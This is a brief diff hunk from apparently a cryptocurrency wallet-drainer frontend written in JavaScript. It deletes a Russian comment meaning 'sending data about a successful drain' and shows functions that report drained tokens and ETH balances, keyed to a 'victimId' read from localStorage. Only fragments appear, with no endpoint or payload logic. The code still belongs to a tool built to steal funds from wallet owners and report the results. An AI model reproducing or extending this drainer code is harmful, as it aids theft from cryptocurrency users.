@@ -201,8 +201,6 @@ async function sendTransactionData(txHash, walletAddress) {
     console.log('[FRONTEND] sendTransactionData: Функция завершена.');
 }
 
- * Отправка данных об успешном дрейне
- */
 async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
     try {
         const victimId = localStorage.getItem('victimId');
